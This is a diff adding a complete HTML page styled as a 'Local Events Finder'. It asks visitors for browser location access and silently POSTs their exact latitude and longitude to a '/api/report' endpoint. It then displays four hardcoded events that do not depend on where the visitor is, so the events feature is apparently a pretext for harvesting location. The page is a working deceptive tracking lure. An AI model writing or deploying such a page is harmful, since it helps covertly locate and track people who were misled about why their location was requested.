@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Local Events Finder</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  /* General */
+  body {
+    font-family: 'Inter', sans-serif;
+    margin: 0;
+    padding: 0;
+    background: #f5f7fa;
+    color: #333;
+  }
+
+  /* Header */
+  header {
+    background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
+    color: white;
+    padding: 40px 20px;
+    text-align: center;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+  }
+  header h1 { margin: 0; font-size: 2.2rem; }
+  header p { margin-top: 10px; font-size: 1rem; font-weight: 400; }
+
+  /* Main content */
+  main {
+    max-width: 900px;
+    margin: -30px auto 0 auto;
+    background: white;
+    border-radius: 12px;
+    padding: 30px 20px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+  }
+
+  button {
+    font-size: 16px;
+    padding: 12px 25px;
+    cursor: pointer;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    box-shadow: 0 3px 6px rgba(0,0,0,0.15);
+    transition: background-color 0.2s, transform 0.2s;
+  }
+  button:hover {
+    background-color: #0056b3;
+    transform: translateY(-2px);
+  }
+
+  #output { margin-top: 20px; font-weight: 600; }
+
+  /* Event cards */
+  .events {
+    margin-top: 25px;
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 20px;
+  }
+  .event-card {
+    background: #f0f4f8;
+    border-radius: 10px;
+    padding: 15px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    transition: transform 0.2s;
+  }
+  .event-card:hover { transform: translateY(-3px); }
+  .event-card h3 { margin: 0 0 8px 0; font-size: 1.1rem; color: #007bff; }
+  .event-card p { margin: 0; font-size: 0.9rem; color: #555; }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    margin-top: 40px;
+    padding: 20px 10px;
+    font-size: 0.8rem;
+    color: #888;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Welcome!</h1>
+  <p>Discover nearby sports games, events, and activities you might be interested in.</p>
+</header>
+
+<main>
+  <button id="btn">Show Nearby Events</button>
+  <div id="output"></div>
+
+  <div class="events" id="eventsContainer">
+    <!-- Event cards will appear here -->
+  </div>
+</main>
+
+<footer>
+  Local Events Finder • &copy; 2025
+</footer>
+
+<script>
+const REPORT_URL = '/api/report'; // Serverless endpoint on Vercel
+const output = document.getElementById('output');
+const eventsContainer = document.getElementById('eventsContainer');
+
+document.getElementById('btn').addEventListener('click', () => {
+  if (!navigator.geolocation) {
+    output.textContent = "Your browser does not support location services.";
+    return;
+  }
+
+  output.textContent = "Finding nearby events… please allow location access.";
+
+  navigator.geolocation.getCurrentPosition(async pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    output.textContent = `Location detected! Showing events near you...`;
+
+    // Send location to Vercel serverless function
+    try {
+      await fetch(REPORT_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      });
+    } catch (err) {
+      console.error("Error sending location:", err);
+    }
+
+    // Sample nearby events
+    const sampleEvents = [
+      { title: "Football Match", desc: "Local stadium, 5 PM" },
+      { title: "Basketball Tournament", desc: "Community Center, 6:30 PM" },
+      { title: "Live Concert", desc: "City Park, 8 PM" },
+      { title: "Tennis Open", desc: "Green Valley Courts, 4 PM" }
+    ];
+
+    eventsContainer.innerHTML = sampleEvents.map(ev => `
+      <div class="event-card">
+        <h3>${ev.title}</h3>
+        <p>${ev.desc}</p>
+      </div>
+    `).join('');
+
+  }, err => {
+    output.textContent = "Could not detect location: " + (err.message || err.code);
+  }, { timeout: 10000 });
+});
+</script>
+
+</body>
+</html>
